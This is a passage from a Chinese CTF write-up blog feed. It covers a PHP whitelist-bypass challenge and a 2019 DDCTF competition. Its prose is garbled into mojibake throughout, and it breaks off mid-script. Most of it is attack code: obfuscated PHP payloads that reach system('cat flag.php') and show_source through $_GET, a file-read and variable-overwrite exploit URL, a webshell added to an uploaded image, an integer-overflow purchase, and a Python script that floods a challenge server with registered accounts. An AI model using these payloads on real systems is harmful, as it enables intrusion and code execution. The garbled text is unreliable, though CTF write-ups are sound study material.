<p>æ„é€ å¦‚ä¸‹ Payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">2146934604002</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">727432</span>,<span class="number">10</span>,<span class="number">36</span>).$pi(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">46</span>)).$pi(<span class="number">33037</span>,<span class="number">10</span>,<span class="number">36</span>));</span><br></pre></td></tr></table></figure></div>
<p>å¯æƒœè¶…è¿‡å­—ç¬¦é•¿åº¦é™åˆ¶äº†ï¼Œåœ¨æœ¬åœ°æ²¡æœ‰å­—ç¬¦é™åˆ¶æ¡ä»¶ä¸‹æµ‹è¯• å¯ä»¥è¯»å–</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjc8c7j30q106f3yt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjc8c7j30q106f3yt.jpg" class="lazyload" title="test"></a></p>
<p>ç”±äº <code>Ascii</code> è½¬æˆ <code>Hex</code> åè½¬å›æ¥éœ€è¦ <code>hex2bin</code> å‡½æ•°ï¼Œè€Œç™½åå•é‡Œå¹¶æ²¡æœ‰è¿™ä¸ªå‡½æ•°<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨è¿›åˆ¶è½¬æ¢è¿›è¡Œç»•è¿‡ï¼Œåˆå› ä¸º <code>hex2bin</code> é‡Œéƒ¨åˆ†å­—æ¯åªæœ‰åœ¨32è¿›åˆ¶åæ‰ä¼šå‡ºç°ï¼Œæ‰€ä»¥æ­¤å¤„æˆ‘ä»¬é€‰æ‹©36è¿›åˆ¶ã€‚<br>å°† <code>hex2bin</code> ç”±36è¿›åˆ¶æˆæ— å­—æ¯çš„10è¿›åˆ¶å¾—åˆ°ï¼š<code>37907361743</code>æˆ‘ä»¬ä½¿ç”¨ <code>base_convertï¼ˆ37907361743ï¼Œ10,36)</code> å³å¯è½¬æ¢æˆ <code>hex2bin</code>ï¼Œè€Œ<code>_GET</code>çš„ <code>hex</code> ä¸º <code>5f474554</code>ï¼Œé‡Œè¾¹åŒ…å«äº†å­—æ¯fï¼Œéœ€è¦åœ¨è¿›è¡Œä¸€æ¬¡è½¬æ¢ï¼šfæ­£å¥½ä¸º16è¿›åˆ¶é‡Œçš„æœ€åä¸€ä¸ªå­—æ¯ï¼Œå¯ç›´æ¥ä½¿ç”¨ <code>dechex(1598506324)</code> å³å¯ç»•è¿‡ã€‚æ•… </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure></div>

<p>å³ä¸º <code>$pi = _GET</code><br>æ¥ç€æ„é€  <code>$$pi = $_GET</code> ï¼Œå¯çŸ¥ <code>$$pi[x]()</code> å¯ä»¥è‡ªå®šä¹‰å‡½æ•°åï¼Œ ä½† <code>[]</code>å†…ä¸èƒ½ä¸ºå­—æ¯ï¼Œå› æ­¤é‡‡ç”¨ <code>$$pi{0}($$pi{1})</code><br>Payload å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;0&#125;($$pi&#123;1&#125;);&amp;0&#x3D;show_source&amp;1&#x3D;flag.php</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138bdrfj313l05qt95.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138bdrfj313l05qt95.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="è§£æ³•2"><a href="#è§£æ³•2" class="headerlink" title="è§£æ³•2"></a>è§£æ³•2</h2><p>åŒæ ·çš„ï¼Œæˆ‘ä»¬fuzzå‘ç°æ— æ³•å¼‚æˆ–å‡º <code>*</code>ï¼Œéœ€è¦å€ŸåŠ© <code>hex2bin</code> å‡½æ•°ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> base_convert(<span class="string">'system'</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="comment">// cat * çš„åå…­è¿›åˆ¶ä¸º 636174202a</span></span><br><span class="line">    <span class="keyword">echo</span> hexdec(<span class="string">'636174202a'</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> hex2bin(dechex(<span class="number">426836762666</span>));</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj6d6oj30fr0ce758.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj6d6oj30fr0ce758.jpg" class="lazyload" title="test"></a></p>
<p>payloadå¦‚ä¸‹:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">426836762666</span>)))</span><br></pre></td></tr></table></figure></div>

<hr>
<p>ä½†æ˜¯é•¿åº¦è¶…äº†ï¼Œ éœ€è¦æƒ³åŠæ³•ç¼©çŸ­å­—ç¬¦<br>é€šè¿‡ç™¾åº¦ï¼Œ å‘ç° <code>nl</code> å‘½ä»¤ä¹Ÿå¯ä»¥è¯»å–æ–‡ä»¶<br>fuzz <code>hex2bin</code> çš„è¿›åˆ¶æ•°å‘ç° <code>1438255411</code> æ›´çŸ­</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aofmj30eg06oglx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aofmj30eg06oglx.jpg" class="lazyload" title="test"></a></p>
<p>æœ€ç»ˆ Payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">($pi=base_convert)(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(dechex(<span class="number">1852579882</span>)))</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°<strong>flag</strong><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjbep2j30yd0hy414.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjbep2j30yd0hy414.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="è§£æ³•3"><a href="#è§£æ³•3" class="headerlink" title="è§£æ³•3"></a>è§£æ³•3</h2><p>ç”±è§£æ³•1å¯ä»¥çŸ¥é“ï¼Œå¯ä»¥å¼‚æˆ–å‡º <code>_</code>ï¼Œ è€Œä¸” â€˜$â€™ æ²¡æœ‰è¢«wafï¼Œ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>$_GET</code>å…¨å±€å˜é‡æ‰‹åŠ¨ä¼ å…¥å‚æ•°æ¥ getshell;<br>è™½ç„¶ <code>[]</code> è¢«wafäº†ï¼Œ ä½†æ˜¯å¯ä»¥ç”¨ <code>{}</code> æ¥æå–æ•°ç»„ä¸­çš„å€¼.<br>é€šè¿‡ä¸Šè¿°çš„è„šæœ¬,å¯ä»¥å¾—åˆ°<br><code>1^n=_; 5^r=G; 1^t=E; 7^c=T</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138dfr7j30dm09a0t3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138dfr7j30dm09a0t3.jpg" class="lazyload" title="test"></a></p>
<p>ä¸éš¾æ„é€ å‡º<br><code>$pi=base_convert;$pi=$pi(53179,10,36)^$pi(1109136,10,36);${$pi}{0}(${$pi}{1})</code></p>
<p>payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>=system&amp;<span class="number">1</span>=cat flag.php&amp;c=$pi=base_convert;$pi=$pi(<span class="number">53179</span>,<span class="number">10</span>,<span class="number">36</span>)^$pi(<span class="number">1109136</span>,<span class="number">10</span>,<span class="number">36</span>);$&#123;$pi&#125;&#123;<span class="number">0</span>&#125;($&#123;$pi&#125;&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line"><span class="number">0</span>=show_source&amp;<span class="number">1</span>=flag.php&amp;c=$pi=base_convert;$pi=$pi(<span class="number">53179</span>,<span class="number">10</span>,<span class="number">36</span>)^$pi(<span class="number">1109136</span>,<span class="number">10</span>,<span class="number">36</span>);$&#123;$pi&#125;&#123;<span class="number">0</span>&#125;($&#123;$pi&#125;&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aof9j30mt05cmxe.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aof9j30mt05cmxe.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>æœ€è¿‘çŠ¶æ€æœ‰æ‰€æ¾æ‡ˆï¼Œæ³¨æ„ä¼‘æ¯ï¼Œå®‰å¿ƒå­¦ä¹ ï¼ŒåŠªåŠ›é™ä¸‹å¿ƒæ¥</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2019â€œå¼Ÿå¼Ÿå¹å¤´å‘â€wp</title>
    <url>/yakko117/2019/04/18/DDctf2019/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™å‘¨çš„æ¯”èµ›æ²¡æ€ä¹ˆèŠ±æ—¶é—´åšé¢˜ï¼Œè‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œä¸€å †çš„ä¸œè¥¿ä¸ä¼š</p>
<h2 id="Misc-01-ç­¾åˆ°é¢˜"><a href="#Misc-01-ç­¾åˆ°é¢˜" class="headerlink" title="Misc-01 ç­¾åˆ°é¢˜"></a>Misc-01 ç­¾åˆ°é¢˜</h2><p>çœŸç­¾åˆ°é¢˜ï¼Œå°±åœ¨å…¬å‘Šé‡Œç›´æ¥å¤åˆ¶flagæäº¤å°±å¥½äº†</p>
<hr>
<h2 id="Web-01-æ»´"><a href="#Web-01-æ»´" class="headerlink" title="Web-01 æ»´"></a>Web-01 æ»´</h2><p>æŸ¥çœ‹æºç  payload <code>jpg=index.php</code>ï¼ˆTmprMlpUWTBOalUzT0RKbE56QTJPRGN3ï¼‰</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruwpzdj30n406gaa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruwpzdj30n406gaa4.jpg" class="lazyload" title="test"></a></p>
<p>è·å¾— <code>base64</code> çš„ç  </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU&#x2F;DQogKg0KICovDQoNCj8+DQo&#x3D;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åbase64è§£ç ï¼Œå¾—åˆ°wafçš„æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&amp;lt;title&amp;gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>çœ‹åˆ°æ³¨é‡Šé‡Œæœ‰ä¸ªCSDNçš„åšå®¢æ–‡ç« ï¼ŒçœŸçš„æƒ³æ¯’æ‰“ä¸€é¡¿å‡ºé¢˜äºº,æˆ‘è¿˜ä»¥ä¸ºtipsåœ¨è¿™ç¯‡æ–‡ç« ï¼Œç»“æœä¸æ˜¯ï¼Œåœ¨ä»–çš„å¦ä¸€ç¯‡é‡Œï¼Œæˆ‘ç‰¹ä¹ˆâ€¦</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e2jgaj31280ibtky.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e2jgaj31280ibtky.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åPayloadï¼š <code>practice.txt.swp</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e3bkrj30fo04ddfs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e3bkrj30fo04ddfs.jpg" class="lazyload" title="test"></a></p>
<p>å†å» <code>index.php</code> é‡Œ <code>Payload</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">img&#x3D;f1agconfigddctf.php(è¦è½¬ç )</span><br><span class="line">TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°æ–°çš„ <code>base64</code> æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHANCmluY2x1ZGUoJ2NvbmZpZy5waHAnKTsNCiRrID0gJ2hlbGxvJzsNCmV4dHJhY3QoJF9HRVQpOw0KaWYoaXNzZXQoJHVpZCkpDQp7DQogICAgJGNvbnRlbnQ9dHJpbShmaWxlX2dldF9jb250ZW50cygkaykpOw0KICAgIGlmKCR1aWQ9PSRjb250ZW50KQ0KCXsNCgkJZWNobyAkZmxhZzsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobydoZWxsbyc7DQoJfQ0KfQ0KDQo&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></div>
<p>è§£ç åä¸º</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ä¸€ä¸ªç®€å•çš„å˜é‡è¦†ç›–é—®é¢˜äº†<br>æ„é€  Payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.51.150.246&#x2F;f1ag!ddctf.php?k&#x3D;1&amp;uid&#x3D;</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9dzv65j30e9028q38.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9dzv65j30e9028q38.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="Web-03-Upload-IMG"><a href="#Web-03-Upload-IMG" class="headerlink" title="Web-03 Upload-IMG"></a>Web-03 Upload-IMG</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm125r3j30bu043jrh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm125r3j30bu043jrh.jpg" class="lazyload" title="test"></a></p>
<p>å…ˆéšä¾¿ä¸Šä¼ ä¸€å¼ å›¾è¯•ä¸€ä¸‹ï¼Œå‘ç°å›æ˜¾</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm1auqbj30h604lgma.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm1auqbj30h604lgma.jpg" class="lazyload" title="test"></a></p>
<p>è¦æ±‚ <code>phpinfo()</code> ,åœ¨åŠ é©¬ä¸Šå»åï¼Œå‘ç°å›æ˜¾ä»ç„¶å­˜åœ¨ï¼Œçœ‹æ ·å­æ˜¯äºŒæ¬¡æ¸²æŸ“;<br>å‘ç°å¼€å¤´æ˜¯ php-gd ä¼šå¸¦ç€ gbjpeg è½¬æ¢ã€‚<br>ç„¶åå°±ç”¨winhex ä¼ å›¾ã€åŠ é©¬ã€æŠŠå›¾ä¸‹ä¸‹æ¥ï¼Œå¯¹æ¯”ï¼Œçœ‹å“ªé‡Œçš„æºç æ²¡å˜<br>ç„¶åå°±æ˜¯fuzz æ·»åŠ  <code>phpinfo()</code> ä¹ä¸ªå­—ç¬¦</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruusamj30mt04iq3c.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruusamj30mt04iq3c.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°±å¾—åˆ°flagäº†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruut21j30k804kt8y.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruut21j30k804kt8y.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="Web-06-å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡"><a href="#Web-06-å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡" class="headerlink" title="Web-06 å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡~"></a>Web-06 å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šåƒé¸¡~</h2><p>è¿™ä¸ªé¢˜åšçš„æ—¶å€™è¯´å®è¯ä¸€å¼€å§‹æŒºæ‡µçš„<br>æ³¨å†Œåå‘ç°é’±ä¸å¤Ÿä¹°ç¥¨ï¼Œå°è¯•æ”¹ä»·æ ¼ï¼Œ 0ï¼Œ1ï¼Œ100ï¼Œ-2000 ç­‰ç­‰<br>æ‡µäº†å¾ˆä¹…åï¼Œé—®äº†åŒå­¦ï¼Œå¾—åˆ°tipsï¼Œæ˜¯æº¢å‡º ORZâ€¦ è¡Œå§<br>æŠŠ2000 æ”¹æˆ 2^32<br>å°±æ˜¯ï¼š4294967296</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruxpusj30zd0mj0zx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruxpusj30zd0mj0zx.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå®ç°å…è´¹è´­ç¥¨</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruvq42j30o90a274z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruvq42j30o90a274z.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°±æ˜¯å¹²æ‰è¿™äº›è„šæœ¬åƒé¸¡<br>æ€è·¯å°±æ˜¯æ³¨å†Œå°å·ç„¶åç§»é™¤å°å·<br>åé¢å°±æ‹œæ‰˜å¤§ä½¬å¸®å¿™å†™è„šæœ¬(çœŸçš„è¦å»çœ‹Pythonäº†å•Šå•Šå•Šå•Š)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">main_session = requests.session()</span><br><span class="line"></span><br><span class="line">main_session.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=Admin111&amp;password=12345678"</span>)</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_bot</span><span class="params">(id, ticket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> main_session</span><br><span class="line"></span><br><span class="line">    print(main_session.get(<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span>).json())</span><br><span class="line"></span><br><span class="line">    print(main_session.get(<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id="</span> + str(id) + <span class="string">"&amp;ticket="</span> + str(ticket)).json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bot</span><span class="params">(index=<span class="number">1</span>)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    s.get(<span class="string">'http://117.51.147.155:5050/ctf/api/register?name=robot111'</span> + str(index) + <span class="string">'&amp;password=12345678'</span>)</span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296'</span>)</span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span> + r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>], r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_and_remove</span><span class="params">(index=<span class="number">1</span>)</span>:</span></span><br><span class="line">    info = create_bot(index)</span><br><span class="line">    remove_bot(info[<span class="number">0</span>], info[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span 